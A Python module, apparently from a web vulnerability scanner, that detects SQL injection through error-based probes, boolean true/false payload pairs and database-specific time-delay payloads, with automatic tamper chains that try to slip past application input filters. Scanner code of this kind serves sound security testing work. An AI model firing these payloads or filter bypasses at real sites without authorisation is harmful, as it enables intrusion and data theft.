"""SQL injection: error-based (signature DB), boolean-based (differential) and time-based."""

from __future__ import annotations

import random
import re

from webguard.detection.baseline import similarity
from webguard.detection.context import ACTIVE_VARIANT, Context
from webguard.detection.tamper import AUTO_CHAINS, apply_tamper
from webguard.models import DIFFERENTIAL, SIGNATURE, TIMING, Confidence, Finding, InjectionPoint, Severity

ERROR_PROBES = ["'", '"', "\\", "')", "'\")", "`", "';", "' AND", "%27", "1'1"]

# (true_template, false_template); {o}=original value, {n}/{m} random distinct integers
BOOLEAN_PAIRS_NUMERIC = [
    ("{o} AND {n}={n}", "{o} AND {n}={m}"),
    ("{o}) AND ({n}={n}", "{o}) AND ({n}={m}"),
]
BOOLEAN_PAIRS_STRING = [
    ("{o}' AND '{n}'='{n}", "{o}' AND '{n}'='{m}"),
    ("{o}' AND {n}={n}-- -", "{o}' AND {n}={m}-- -"),
    ('{o}" AND "{n}"="{n}', '{o}" AND "{n}"="{m}'),
    ("{o}') AND ('{n}'='{n}", "{o}') AND ('{n}'='{m}"),
]

TIME_PAYLOADS = {
    "MySQL": ["{o}' AND SLEEP({d})-- -", "{o} AND SLEEP({d})", "{o}' AND (SELECT 1 FROM (SELECT SLEEP({d}))x)-- -"],
    "PostgreSQL": ["{o}' AND 1=(SELECT 1 FROM pg_sleep({d}))-- -", "{o};SELECT pg_sleep({d})-- -"],
    "Microsoft SQL Server": ["{o}'; WAITFOR DELAY '0:0:{d}'-- -", "{o}; WAITFOR DELAY '0:0:{d}'-- -"],
    "Oracle": ["{o}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('wg',{d})-- -"],
}

DESCRIPTION = (
    "User input is concatenated into a SQL query without parameterisation, allowing an attacker to "
    "alter the query's logic. Depending on privileges this enables data theft, authentication bypass, "
    "data modification and sometimes remote code execution."
)
REMEDIATION = (
    "Use parameterised queries / prepared statements (or a safe ORM API) for every query. Apply "
    "least-privilege database accounts and do not expose raw database errors to clients."
)
REFS = ["https://owasp.org/www-community/attacks/SQL_Injection", "https://cwe.mitre.org/data/definitions/89.html"]


def _finding(point: InjectionPoint, title: str, conf: Confidence, payload: str, evidence: str,
             detection: str, ctx: Context, features: dict[str, float] | None = None, dbms: str | None = None,
             tamper: tuple[str, ...] = ()) -> Finding:
    return Finding(
        check="sqli",
        title=title,
        severity=Severity.HIGH if conf < Confidence.CERTAIN else Severity.CRITICAL,
        confidence=conf,
        url=point.url,
        method=point.method,
        parameter=point.name,
        location=point.location,
        payload=payload,
        evidence=evidence,
        description=DESCRIPTION + (f" Back-end DBMS appears to be {dbms}." if dbms else ""),
        remediation=REMEDIATION,
        cwe="CWE-89",
        owasp="A03:2021-Injection",
        detection=detection,
        references=REFS,
        tags=["injection", "sqli"] + ([dbms.lower()] if dbms else []) + ([f"tamper:{'+'.join(tamper)}"] if tamper else []),
        request=ctx.curl(point, payload),
        features=features or {},
    )


FILTER_HINT = re.compile(r"(?i)invalid (?:characters?|input|value|parameter|request)|not allowed|illegal "
                         r"(?:characters?|input)|forbidden characters?|bad input|disallowed|hack(?:ing)? attempt|"
                         r"possible (?:attack|injection)|detected (?:sql|injection)")


async def run(ctx: Context, point: InjectionPoint) -> None:
    base = await ctx.baseline(point)
    if base is None:
        return
    signals = {"filtered": 0, "obstructed": 0}
    if await _detect(ctx, point, base, ctx.config.tamper, signals, timing=True, label=""):
        return
    # Basics failed. If the APPLICATION reacted like an input blacklist (not a WAF/CDN), try tamper chains.
    if not ctx.config.auto_tamper or ctx.config.tamper or signals["obstructed"] or not signals["filtered"]:
        return
    if ACTIVE_VARIANT.get() is not None:
        return  # an encoding variant is already being tried; don't multiply it by every tamper chain
    for chain in AUTO_CHAINS:
        if await _detect(ctx, point, base, chain, {"filtered": 0, "obstructed": 0}, timing=False,
                         label=f" - input filter bypassed with tamper {'+'.join(chain)}"):
            return


def _observe(ctx: Context, point: InjectionPoint, base, r, signals: dict) -> None:
    """Classify a probe response: application input filter vs. WAF/CDN obstruction."""
    if not ctx.app_answered(r, point, "sqli"):
        signals["obstructed"] += 1
    elif base.primary.status < 400 and (r.status in (400, 403, 406, 422) or FILTER_HINT.search(r.text[:5000])):
        signals["filtered"] += 1


async def _detect(ctx: Context, point: InjectionPoint, base, tamper: tuple[str, ...], signals: dict,
                  timing: bool, label: str) -> bool:
    o = point.original
    # 1) error-based -------------------------------------------------------------
    dbms = None
    for probe in ERROR_PROBES:
        payload = apply_tamper(o + probe, tamper)
        r = await ctx.send(point, payload)
        if r is None:
            continue
        _observe(ctx, point, base, r, signals)
        m = ctx.sigdb.match_sql_error(r.text)
        if m and not any(ctx.sigdb.match_sql_error(s.text) for s in base.samples):
            dbms = m.name
            ctx.report(_finding(
                point, f"SQL injection (error-based, {m.name}){label}", Confidence.FIRM, payload,
                f"DBMS error triggered by payload: {m.value}", SIGNATURE, ctx,
                {"error_signature": 1.0, "status": float(r.status)}, dbms=m.name, tamper=tamper,
            ))
            break

    # 2) boolean-based differential ----------------------------------------------
    if base.stable_similarity >= 0.6:  # too dynamic pages give unreliable diffs
        pairs = BOOLEAN_PAIRS_NUMERIC + BOOLEAN_PAIRS_STRING if o.lstrip("-").isdigit() else BOOLEAN_PAIRS_STRING
        for true_t, false_t in pairs:
            ok, feats, payload = await _boolean_test(ctx, point, base, true_t, false_t, tamper, signals)
            if ok:
                ctx.report(_finding(
                    point, f"SQL injection (boolean-based blind){label}", Confidence.FIRM, payload,
                    "TRUE condition reproduces the original page while FALSE condition changes it "
                    f"(similarity true={feats['sim_true']:.2f}, false={feats['sim_false']:.2f}, "
                    f"baseline stability={feats['stability']:.2f}); confirmed with 2 random value pairs.",
                    DIFFERENTIAL, ctx, feats, dbms=dbms, tamper=tamper,
                ))
                return True
    if ctx.has("sqli", point):
        return True

    # 3) time-based ---------------------------------------------------------------
    if timing and ctx.config.timing_checks:
        candidates = TIME_PAYLOADS.items()
        if dbms in TIME_PAYLOADS:
            candidates = [(dbms, TIME_PAYLOADS[dbms])]
        for db, templates in candidates:
            for tpl in templates:
                ok, ev = await ctx.timing_confirm(
                    point, lambda d, t=tpl: apply_tamper(t.format(o=o, d=d), tamper), base
                )
                if ok:
                    payload = apply_tamper(tpl.format(o=o, d=int(ev.get("delay", ctx.config.time_delay))), tamper)
                    ctx.report(_finding(
                        point, f"SQL injection (time-based blind, {db}){label}", Confidence.FIRM, payload,
                        f"Response delay follows the injected sleep value: {ev}", TIMING, ctx, ev, dbms=db,
                        tamper=tamper,
                    ))
                    return True
    return False


async def _boolean_test(ctx: Context, point: InjectionPoint, base, true_t: str, false_t: str,
                        tamper: tuple[str, ...] = (), signals: dict | None = None):
    o = point.original
    feats: dict[str, float] = {}
    payload = ""
    for attempt in range(2):
        n = random.randint(100, 9999)
        m = n + random.randint(1, 50)
        t_payload = apply_tamper(true_t.format(o=o, n=n, m=m), tamper)
        f_payload = apply_tamper(false_t.format(o=o, n=n, m=m), tamper)
        rt = await ctx.send(point, t_payload)
        rf = await ctx.send(point, f_payload)
        if rt is None or rf is None:
            return False, feats, payload
        if signals is not None:
            _observe(ctx, point, base, rt, signals)
        # a block page / challenge for the FALSE payload is a classic boolean-SQLi false positive
        if not (ctx.app_answered(rt, point, "sqli") and ctx.app_answered(rf, point, "sqli")):
            return False, feats, payload
        reflect = [t_payload, f_payload]
        sim_true = similarity(rt.text, base.primary.text, reflect)
        sim_false = similarity(rf.text, base.primary.text, reflect)
        stability = base.stable_similarity
        true_ok = base.matches(rt, reflect=reflect)
        false_differs = (rf.status != base.primary.status) or (sim_false < stability - 0.15)
        if not (true_ok and false_differs and sim_true - sim_false > 0.1):
            return False, feats, payload
        # the FALSE page must also not be what *any* garbage produces (input validation error pages)
        if attempt == 0:
            junk = await ctx.send(point, apply_tamper(o + "wg" + str(n), tamper))
            if junk is not None and not base.matches(junk, reflect=[o + "wg" + str(n)]):
                # app rejects any change -> only accept if FALSE page differs from the junk page too
                if similarity(rf.text, junk.text, reflect) > 0.95 and rf.status == junk.status:
                    return False, feats, payload
        feats = {"sim_true": sim_true, "sim_false": sim_false, "stability": stability,
                 "status_true": float(rt.status), "status_false": float(rf.status)}
        payload = t_payload
    return True, feats, payload
